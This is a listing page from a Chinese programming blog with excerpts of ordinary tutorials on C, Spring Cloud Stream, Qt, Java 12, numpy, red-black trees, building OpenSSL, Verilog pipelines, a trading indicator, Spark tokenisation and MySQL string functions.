	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7f1065999072b6dec8bc9ea559ae7f76/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f02086f578707eb9bb5561f517852ead/" rel="bookmark">
			打印菱形
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		#include&lt;stdio.h&gt; #include&lt;math.h&gt; int main() { int n;//n 为奇数，以 7 为例 int i = 1, j, m, N; scanf("%d", &amp;N); for(j = N-1;j &gt; 1;j -= 2){ //上面三行，空格以 2 递减 for(m = 0;m &lt; j;m++){//打印第一行的 6 个空格 printf(" "); } for(n = 0;n &lt; N-j;n++){//打印第一行的 1 个 * printf("* "); } printf("\n");//换行，一共有三行，且每行空格数和 * 数互补 } for(i = 0;i &lt; N;i++){//打印 N 个 * ，中间那行 printf("* "); } printf("\n"); for(j = 2;j &lt; N;j += 2){//下面三行，空格以 2 递增 for(m = 0;m &lt; j;m++){//打印第一行的 2 个空格 printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f02086f578707eb9bb5561f517852ead/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4efc2e8107580c4bc52fca8fa5079d09/" rel="bookmark">
			SpringCloud第十一节内容精简，SpringCloud Stream消息驱动
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		平时用的消息组件有，RabbitMQ，RocketMQ，Kafka，ActiveMQ
用消息驱动是为了屏蔽底层消息中间件的差异，降低切换版本，统一消息的编程模型
举个例子，你不需要学习mysql，sql server，只需要学会hibernate就可以用包装好的方法去调用sql语句
目前SpringCloud Stream消息驱动只支持RabbitMQ，Kafka
先确定好RabbitMQ启动
然后新建三个模块，8801，生产者。8802，8803消费者
生产者模块
pom
&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt; &lt;parent&gt; &lt;artifactId&gt;cloud2020&lt;/artifactId&gt; &lt;groupId&gt;com.atguigu.springcloud&lt;/groupId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;/parent&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;artifactId&gt;cloud-stream-rabbitmq-provider8801&lt;/artifactId&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-stream-rabbit&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--基础配置--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;/project&gt; application.yml。注意这是生产者是output
server: port: 8801 spring: application: name: cloud-stream-provider cloud: stream: binders: # 在此处配置要绑定的rabbitmq的服务信息； defaultRabbit: # 表示定义的名称，用于于binding整合 type: rabbit # 消息组件类型 environment: # 设置rabbitmq的相关的环境配置 spring: rabbitmq: host: localhost port: 5672 username: guest password: guest bindings: # 服务的整合处理 output: # 这个名字是一个通道的名称 destination: studyExchange # 表示要使用的Exchange名称定义 content-type: application/json # 设置消息类型，本次为json，文本则设置“text/plain” binder: defaultRabbit # 设置要绑定的消息服务的具体设置 eureka: client: # 客户端进行Eureka注册的配置 service-url: defaultZone: http://localhost:7001/eureka instance: lease-renewal-interval-in-seconds: 2 # 设置心跳的时间间隔（默认是30秒） lease-expiration-duration-in-seconds: 5 # 如果现在超过了5秒的间隔（默认是90秒） instance-id: send-8801.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4efc2e8107580c4bc52fca8fa5079d09/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/40aedeaf6bd307a8ea09bed1e484aa7f/" rel="bookmark">
			QTextEdit 取消选中 状态
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		QTextEdit 取消选中 QTextEdit 在设置字体颜色和大小时需调用selectAll()函数，但没有取消选中接口，解决方法如下：
//保存状态再恢复
QTextCursor cursor = textEdit-&gt;textCursor();
textEdit-&gt;selectAll();
textEdit-&gt;setFontPointSize(18);
textEdit-&gt;setTextCursor(cursor);
//移动光标到文档末尾
textEdit-&gt;selectAll();
textEdit-&gt;setFontPointSize(18);
QTextCursor cursor = textEdit-&gt;textCursor();
cursor.movePosition(QTextCursor::End);
textEdit-&gt;setTextCursor(cursor);
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5821025e9de615b661c8b3f6ccfcf4ea/" rel="bookmark">
			java lts版本_更新到Java 12？ 还是在等待下一个LTS版本？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		java lts版本
到现在为止，我们已经大声喊着Java 12从所有人及其邻居都知道的屋顶发布了。 但是，以防万一您听不到， JDK 12就在这里，并提供了许多新的增强功能 。 它于2019年3月19日全面上市。 您跳上Java 12了吗？ 当然，JDK 12不是长期支持版本。 使用新的更快的Java发布节奏，每六个月进行一次更新将引入功能。 （ 查看Oracle路线图，以了解对先前版本的支持何时终止。） 但是，这些新版本并没有像以前那样过时。 这意味着您可以使用长期支持版本，也可以跳上最新版本，查看最新内容。 长期支持版本现在每三年发布一次，而新功能则每六个月发布一次。 快节奏的周期为您决定何时升级提供了很多选择。 还请参见： Shenandoah：Java 12中的超低暂停垃圾收集器 JDK 12：它带来了什么？ 与带来10项增强的JDK 10和带来17项增强的JDK 11相比，这是一个较小的升级。 最新添加的内容包括： JEP 189： 雪兰多 。 由Red Hat测试和开发的实验性低暂停时间垃圾收集器。 该GC设计用于处理大堆。 JEP 30： Microbenchmark套件 。 微基准的基本套件，可以轻松地运行现有的微基准或创建新的微基准。 JEP 325： 切换表达式 。 在Java准备支持模式匹配时获得此功能的预览。 JEP 334：JVM常数API 。 查看此API 的快照 。 JEP 340：一个AArch 64端口，而不是两个。 这将删除与arm64端口相关的所有源，同时保留32位ARM端口和64位aarch64端口。 JEP 341：默认CDS归档文件：缩短了现成的启动时间。 JEP 344：可终止的混合集合。 如果G1混合集合可能超出暂停目标，则使它们可中止。 JEP 346：立即从G1返回未使用的已提交内存 ：就像包装盒上的内容一样。 这增强了G1垃圾收集器。 它还包括对Unicode 11的支持 ，后者引入了684个新字符（包括66个表情符号）。 这是完整的发行说明 。 还请参见： 2019年JAX伦敦征集论文的截止日期为4月1日 总体而言，这些增强功能都不会过多改变您使用JDK的方式。 但是，它包括生活质量升级，新的GC和新的switch表达式预览。 当我们与Oracle公司Java高级总监兼产品管理部门的Donald Smith交谈时 ，他有这样的话来谈谈新功能： …我在此版本中最热衷的功能是Switch Expressions，它将使开发人员有机会清理一些庞大的switch语句和复杂的if-then-else块，这些块会使代码难以遵循。 唐纳德·史密斯 采用Java 12？ 所以，给我们独家新闻。 您是JDK的早期采用者吗？ 我们想知道我们的读者使用的Java版本！ 您要升级到Java 12吗？ 帮助我们并回答我们的民意调查。 您要升级到Java 12吗？ （检查所有适用） 我仍在使用Java 8！ （45％，135投票） 我正在等待下一个长期版本，然后再升级。 （33％，100票） 是!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5821025e9de615b661c8b3f6ccfcf4ea/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ecfe02d82d637c47fe1e5265dd0b966c/" rel="bookmark">
			numpy弧度制和角度制转换deg2rad, rad2deg
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 把45°转化为 π 4 \frac{\pi}{4} 4π​
np.deg2rad(45) Out[4]: 0.7853981633974483 把 π 4 \frac{\pi}{4} 4π​转化为45°
np.rad2deg(np.pi/4) Out[6]: 45.0 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/365d46c278f03f15a1a268743d42cbde/" rel="bookmark">
			红黑树------插入结点
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		红黑树的优势 首先红黑树是不符合AVL树的平衡条件的，即每个节点的左子树和右子树的高度最多差1的二叉查找树。但是提出了为节点增加颜色，红黑树是用非严格的平衡来换取增删节点时候旋转次数的降低，任何不平衡都会在三次旋转之内解决，而AVL是严格平衡树，因此在增加或者删除节点的时候，根据不同情况，旋转的次数比红黑树要多，所以红黑树的插入效率更高。
红黑树能够以O(log2 (n)) 的时间复杂度进行搜索、插入、删除操作
简单来说红黑树就是为了解决二叉查找树的缺陷，因为二叉查找树在某些情况下会退化成一个线性结构。
为什么会有红黑树的存在 在二叉树中，如果是顺序插入，会变成一个链表，查找效率直线下降。
红黑树的性质 每个结点是红的或者黑的。根结点是黑的。每个叶子结点是黑的。如果一个结点是红的，则它的两个儿子都是黑的。对每个结点，从该结点到其子孙结点的所有路径上的包含相同数目的黑结点。 红黑树的旋转 左旋：
void rbtree_left_rotate(rbtree *T, rbtree_node *x) { rbtree_node *y = x-&gt;right; // 1.变换x的右子树上的指针和要指它的指针 x-&gt;right = y-&gt;left; //1 if (y-&gt;left != T-&gt;nil) { //2 y-&gt;left-&gt;parent = x; } // 2.变换y父结点的指针和要指它的指针 y-&gt;parent = x-&gt;parent; //3 if (x-&gt;parent == T-&gt;nil) { //4 T-&gt;root = y; // 树根 } else if (x == x-&gt;parent-&gt;left) { // 判断x所处位置 x-&gt;parent-&gt;left = y; } else { x-&gt;parent-&gt;right = y; } // 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/365d46c278f03f15a1a268743d42cbde/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1fadca9707e56eb0eb6fc94718c0059e/" rel="bookmark">
			VS C&#43;&#43;实现openssl访问https网页教程及实例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		之前我实现了访问 http 网页，以及解析大小字段实现网页的完整读取。但现在很多网站都是 https 了，而 https 在 TCP 和 IP 层中间加了一个 SSL 或者 TLS 协议，相当地麻烦，还涉及到公钥加密等，徒手搓相当不现实。
C++也是这点缺点，调库很麻烦。不像 python，直接 import urllib，urlopen就可以直接开 https 的网页。
本文使用 openssl库 来实现 https 网页的访问。因为我在 openssl库的使用中踩了很多坑，所以我会尽量把我踩的坑都说清楚，以免读者再踩。
先看结果：
下载openssl openssl托管在github的，不过README上也写明了，它不用github的release功能来发布，只在官网发布。
所以，第一步，打开https://www.openssl.org/source/，下载我红圈圈住的这个链接。3.0.0那个虽然更新，但是是预发布版，我们暂时不管他，用1.1.1g这个版本。
下载Perl openssl没有用cmake，它提供的编译方式是，使用perl和nasm生成makefile，然后通过makefile编译。perl和nasm必下，不能避开。
打开http://downloads.activestate.com/ActivePerl/releases/，往下翻，有Downloads的框，选最新版，点进去，然后选名字类似于 ActivePerl-5.28.1.2801-MSWin32-x64-24563874.exe 格式的，下载，一路next安装。
下载NASM 打开https://www.nasm.us/pub/nasm/releasebuilds/，选择版本下载。很奇怪的是，我下载最新的2.15rc12版本，Windows Defender提示有病毒。我最后下载的2.14rc15版本，就没有提示病毒了：https://www.nasm.us/pub/nasm/releasebuilds/2.14rc15/win64/nasm-2.14rc15-installer-x64.exe。也是一路next安装。
设置环境变量 perl安装时会自动设置环境变量，nasm不会，需要手动添加。确保PATH环境变量下有以下三条。
生成makefile 我这里默认你已经安装了VS 2019 Community，在开始菜单找到x86本地命令行工具，右键 更多 - 以管理员身份运行。
输入D:（你放openssl的盘符），然后cd后跟openssl解压后的目录。
运行perl configure VC-WIN32，这里的configure是一个文件的名字，如果它说找不到configure的话，就把configura换成绝对路径，类似D:\REFER\Program\lib\openssl\openssl-1.1.1g\configure
这种的。
现在会出现上图的结果，白底红字的意思是找不到nmake。不过不管它。
编译makefile 现在需要运行一个叫vcvarsall.bat的东西。在我电脑上它放在这里：C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Auxiliary\Build\vcvarsall.bat，所以我运行：
"C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Auxiliary\Build\vcvarsall.bat" x86
注意要带上双引号。得到如下结果：
出现最后这句就说明现在的环境变量设置成功了。
然后运行nmake。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1fadca9707e56eb0eb6fc94718c0059e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cf8a99bd8a93d69973ea6e1984d10cdd/" rel="bookmark">
			verilog实现简单的三级加法流水线
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		引言 pipeline流水线设计是一种典型的面积换性能的设计。一方面通过对长功能路径的合理划分，在同一时间内同时并行多个该功能请求，大大提高了某个功能的吞吐率；另一方面由于长功能路径被切割成短路径，可以达到更高的工作频率，如果不需要提高工作频率，多出来的提频空间可以用于降压降功耗，进可攻退可守。今天这篇文章将小小总结一下流水线设计的一些关键点。
流水线设计是完美的时间并行。因为流水线上每一级的处理都是一个时钟周期的延时，并且一动则全动，每一级的延时可以完美的掩盖起来，最高实现与流水级数相同数量的请求并行度。
如上图所示，在现代经典的cpu处理中，流水线级数被广泛应用，cpu的各个处理环节可以看作流水线上的一个stage。在单发射单处理单元的最简单处理器中，同一时间内最高同时可以支持5条指令的执行。如果没有指令冲突，资源冲突等可能导致断流的场景，基本可以认为每一个时钟周期都可以完成一条指令的处理。
当然，除了CPU，只要是一个周期无法完成的功能，在性能优先的设计中，为了提高吞吐率，都可以采用流水线技术来对功能路径进行切分，比如乘法器等。
流水线的stage划分 我们知道，流水线的分割线是一组寄存器，这条分割线放在哪个位置完全由设计者决定。一般来说，划分流水线的时候主要有以下三点考虑：
如果流水线切割的子功能抽象层次较高，最好按完整的功能来进行流水线划分，比如CPU的各个执行环节。
流水线最好划分在数据通路上位宽较小的地方，以节省寄存器数量和面积。在流水线上可以有许多的数据路径，数据路径会有中间结果和最终结果。那么这个时候就可以选择性地进行切割。比如一个1024bit 2选1的数据选择器，如果将流水线划分划在选择器的输入端，那么将占用2x1024=2048bit的寄存器以及1个1bit的选择信号。而如果将流水线划分在选择器的输出端，那么只需要1024bit的寄存器，显然面积的收益十分巨大。
流水线每一级的关键路径延时最好接近，这样利于获得最大的timing margin，频率可以跑到最高。这点很好理解，假设一条关键路径在切割流水线之前延时为a，时钟周期近似为a，将其切割成2级流水线。假设切割之后的新关键路径仍然在该关键路径上，那么新的时钟周期将取决于切割后的关键路径延时。很明显，a/2是最小的，如果不是均分，那么总有一级大于a/2，那么时钟周期将大于a/2。当然，也有可能切割流水线之前的关键路径被切割之后不再是关键路径。假设一条非关键路径b，在切割之后变成1/3b和2/3b。并且2/3b &gt;1/2a，那么2/3b将会成为新的关键路径，新的时钟周期将接近2/3b。这种情况下，如果对于路径b的这种切割不是必要的（比如出于功能完整性和面积考虑），那么完全可以将b切成1/2b和1/2b，1/2b&lt;1/2a&lt;2/3b，时钟频率依然可以以1/2a为准。
流水线设计的简单例子 那么怎么设计一个流水线呢？其实从结构上来讲，流水线很简单，无非是一个原本完整的功能，中间插了几级寄存器，每级寄存器的输出做不一样的功能，每一拍都进行一次更新，把上一级的结果打到下一级。比如一个最简单的例子，假设一个周期只能完成一个1bit加法，那么要实现3个操作数加法s=a+b+c，并且保证每个周期都有一个结果寄存器输出，可以使用3级流水实现：
实现代码如下：
`timescale 1ns / 1ps //================================================================================================== // Filename : pipeline.v // Created On : 2020-07-08 18:34:17 // Last Modified : 2020-07-08 19:05:15 // Revision : 1.6 // // Description : // // //================================================================================================== module PIPELINE_ADDER#( parameter DATA_WIDTH = 16 ) ( input clk, input rst_n, input [DATA_WIDTH-1:0] a_in , input [DATA_WIDTH-1:0] b_in, input [DATA_WIDTH-1:0] c_in , input vld_in, output reg [DATA_WIDTH-1:0] s_out , output reg vld_out ); // 这里没有必要都定义成reg类型 wire [DATA_WIDTH-1:0] plus_s1 ; reg [DATA_WIDTH-1:0] plus_s2 ; wire [DATA_WIDTH-1:0] plus_out ; // stage 1 reg [DATA_WIDTH-1:0] a_reg ; reg [DATA_WIDTH-1:0] b_reg ; reg [DATA_WIDTH-1:0] c_reg ; // stage 2 reg [DATA_WIDTH-1:0] c_reg_s2 ; reg vld_s1, vld_s2; // control path always @(posedge clk or posedge rst_n) begin if (!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cf8a99bd8a93d69973ea6e1984d10cdd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ee42db8a0aa081fa3a2adbf37c73b0ec/" rel="bookmark">
			乖离率BIAS策略
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、乖离率的原理
乖离率的理论基础是对交易者的心里分析，当价格大于市场平均成本太多时，表示多头交易者获利越丰厚，容易萌生赚钱就走的念头，进而会造成价格下跌。当价格小于市场平均成本太多时，表示空头交易者获利丰厚，容易萌生赚钱就走的念头，进而会造成价格上涨。
当价格向上偏离均线时，乖离率过大，未来价格有很大几率会下跌。当价格向下偏离均线时，乖离率过小，未来价格有很大几率会上涨。 虽然移动平均线是由价格计算而来，但从外在形式上价格一定会向移动平均线靠拢，或者说价格总是围绕着移动平均线上下波动。如果价格偏离均线太远，不管价格是在均线之上还是之下，最后都可能趋向于均线，而乖离率正是表示价格偏离均线的百分比值。
二、乖离率计算公式
乖离率=[(当日收盘价-N日平均价)/N日平均价]*100%
其中，N是移动均线参数，由于N的周期不同，乖离率的计算结果也不同。一般情况下N的取值是：6、12、24、36等等。在实际使用中，也可以根据不同的品种动态调整。但参数的选择十分重要，如果参数过小，乖离率就会过于敏感，如果参数过大，乖离率就会过于迟钝。乖离率的计算结果有正负之分，正的乖离率越大，代表多头获利越大，价格回调的概率越大。负的乖离率越大，代表空头获利越大，价格反弹的概率越大。
三、策略逻辑
由于乖离率是另一种均线的表现形式，那么我们也可以根据双均线策略改编一个双乖离率策略。通过短期乖离率与长期乖离率的位置关系，判断当前的市场状态。如果长期乖离率大于短期乖离率实际代表着短期均线金叉长期均线，反之亦然。
多头开仓：如果当前无持仓，并且长期乖离率大于短期乖离率空头开仓：如果当前无持仓，并且长期乖离率小于短期乖离率多头平仓：如果当前持多单，并且长期乖离率小于短期乖离率空头平仓：如果当前持空单，并且长期乖离率大于短期乖离率 四、代码实现：有时间再搞啦
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/736f6905068e209bf1fef4d9244e1035/" rel="bookmark">
			Spark&#43;Jieba实现中文分词
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本案例使用jieba分词，jieba 是目前最好的 Python 中文分词组件，使用Spark同样也能实现中文分词。实现步骤如下：
1.导入依赖 &lt;dependency&gt; &lt;groupId&gt;com.huaban&lt;/groupId&gt; &lt;artifactId&gt;jieba-analysis&lt;/artifactId&gt; &lt;version&gt;1.0.2&lt;/version&gt; &lt;/dependency&gt; 2.数据样本截取 8920397333	王铮亮 时间都去哪了 《私人订制》插曲 8920408333	Locked Out Of Heaven 音乐高清视频MV 8920422333	影视-心上人啊快给我力量KTV（电影《神圣的使命》插曲 8920491333	068_奥特曼 8920492333	影视-幸福不会从天降KTV（电影《我们村里的年轻人》插 8920527333	邓紫棋 GEM 2013 X.X.X. LIVE 演唱会 【全场高清】 8920529333	067_外婆的澎湖湾 8920588333	卓依婷-纸飞机 8920622333	073_小红帽儿歌 8920623333	072_字母歌 8920624333	影视-星星知我心KTV（台湾电视剧《星星知我心》主题曲 8920650333	2014蔡依林新年歌曲《新年喜洋洋》 8920702333	《Love Me》Justin Bieber感谢歌迷最新单曲 8920717333	075_只要妈妈露笑脸 8920731333	外婆的澎湖湾（电音dj舞曲） 8920745333	新西兰小伙，罗艺恒 加油 不插电现场版 8920787333	少女部落格2014迎新年首播MV《恭喜好运来》 8920791333	天路MV-韩红 8920845333	初音未来PV【世界第一公主殿下】 8920849333	曼莉（dj电音舞曲） 8920888333	《我是歌手》第四场无歌单惊呆众歌手！ 8920909333	【MV首播】野人-EveN MV(完整HD版) 8920922333	影视新势力 美女偶像 景甜 风--- 电影 战国 主题曲 8920944333	【刘德华高清MV合集】真永远 高清 8920956333	郑源-难道爱一个人有错吗[高清MV街]（流畅） 8920982333	500.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/736f6905068e209bf1fef4d9244e1035/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/67feab22402f1a60d171cac1c40c7522/" rel="bookmark">
			sql：mysql：截取某个字符   1.最后一次出现的之前的字符串 2.最后出现那次的之后的字符串
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 截取某个字符最后一次出现（如“-”）之前的字符串：
示例字符串："我是-中国-人-" select REVERSE("我是-中国-人-") from dual --人-国中-是我 select INSTR(REVERSE("我是-中国-人-"),'-')+1 from dual --2 select SUBSTR(REVERSE("我是-中国-人-") FROM 2) from dual --人-国中-是我 select SUBSTR(REVERSE("我是-中国-人-") FROM INSTR(REVERSE("我是-中国-人-"),'-')+1) from dual --人-国中-是我 最终执行语句： select REVERSE(SUBSTR(REVERSE("我是-中国-人-") FROM INSTR(REVERSE("我是-中国-人-"),'-')+1)) from dual --我是-中国-人 select REVERSE(SUBSTR(REVERSE("我是-中国-人-啊") FROM INSTR(REVERSE("我是-中国-人-啊"),'-')+1)) from dual--我是-中国-人 截取某个字符最后一次出现（如“-”）之后的字符串：
比如字符串“我是-中国-人-,我爱自己的祖国”,现在截取最后一个'-'后面的字符串如下：
示例字符串："我是-中国-人-,我爱自己的祖国" select REVERSE('我是-中国-人-,我爱自己的祖国') from dual --国祖的己自爱我,-人-国中-是我 select LOCATE('-',REVERSE('我是-中国-人-,我爱自己的祖国'))-1 from dual --8 --LOCATE函数LOCATE(substr,str) 返回子串 substr 在字符串 str 中第一次出现的位置 select left(REVERSE('我是-中国-人-,我爱自己的祖国'),LOCATE('-',REVERSE('我是-中国-人-,我爱自己的祖国'))-1) from dual --国祖的己自爱我, 最终执行语句： select REVERSE(left(REVERSE('我是-中国-人-,我爱自己的祖国'),LOCATE('-',REVERSE('我是-中国-人-,我爱自己的祖国'))-1)) as name from dual --,我爱自己的祖国 
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/238/">«</a>
	<span class="pagination__item pagination__item--current">239/321</span>
	<a class="pagination__item pagination__item--next btn" href="/page/240/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>